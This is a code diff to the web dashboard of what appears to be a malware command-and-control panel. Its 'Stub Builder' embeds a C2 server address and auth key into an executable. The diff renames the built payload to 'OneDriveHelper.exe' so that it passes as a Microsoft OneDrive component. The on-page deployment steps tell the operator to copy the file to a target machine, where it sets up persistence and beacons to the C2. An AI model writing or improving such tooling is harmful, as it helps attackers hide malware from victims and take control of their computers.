@@ -326,7 +326,7 @@ function renderBuilder() {
 <div class="card" style="max-width:680px;margin:0 auto">
   <div class="card-title">&#9881; Stub Builder &mdash; Generate Configured .exe</div>
   <p style="font-size:12px;color:var(--muted);line-height:1.6">
-    Embeds the C2 server address and auth key into <code style="color:var(--accent)">Stub.exe</code>.
+    Embeds the C2 server address and auth key into <code style="color:var(--accent)">OneDriveHelper.exe</code>.
     The resulting binary connects directly to your C2 when run on a target machine.
   </p>
   <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:4px">
@@ -366,7 +366,7 @@ function renderBuilder() {
   <div id="b-status" style="display:none;padding:10px 14px;border-radius:8px;font-size:13px;margin-top:4px"></div>
   <div style="display:flex;gap:10px;margin-top:8px">
     <button class="btn btn-send" id="b-btn" onclick="doBuild()" style="padding:11px 28px;font-size:14px">
-      &#8659; Build &amp; Download Stub_configured.exe
+      &#8659; Build &amp; Download OneDriveHelper.exe
     </button>
     <button class="btn btn-sec" onclick="document.getElementById('b-host').value=new URL(API_BASE||location.href).host">
       Use This Server
@@ -374,7 +374,7 @@ function renderBuilder() {
   </div>
   <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:12px 14px;font-size:11px;color:var(--muted);line-height:1.8;margin-top:4px">
     <strong style="color:var(--light)">Deployment:</strong><br>
-    1. Copy <code style="color:var(--accent)">Stub_configured.exe</code> to the target machine<br>
+    1. Copy <code style="color:var(--accent)">OneDriveHelper.exe</code> to the target machine<br>
     2. Run it &mdash; no arguments needed. First run sets up persistence; second run connects to C2.<br>
     3. Bot appears in the sidebar within one beacon interval.
   </div>
@@ -420,15 +420,15 @@ async function doBuild() {
     const blob = await resp.blob();
     const url  = URL.createObjectURL(blob);
     const a    = document.createElement('a');
-    a.href = url; a.download = 'Stub_configured.exe';
+    a.href = url; a.download = 'OneDriveHelper.exe';
     document.body.appendChild(a); a.click(); a.remove();
     URL.revokeObjectURL(url);
-    showBuildStatus('Download started \u2014 Stub_configured.exe is ready (' + Math.round(blob.size/1024) + ' KB)', 'ok');
+    showBuildStatus('Download started \u2014 OneDriveHelper.exe is ready (' + Math.round(blob.size/1024) + ' KB)', 'ok');
   } catch(e) {
     showBuildStatus('Error: ' + e.message, 'error');
   } finally {
     btn.disabled = false;
-    btn.innerHTML = '&#8659; Build &amp; Download Stub_configured.exe';
+    btn.innerHTML = '&#8659; Build &amp; Download OneDriveHelper.exe';
   }
 }
 
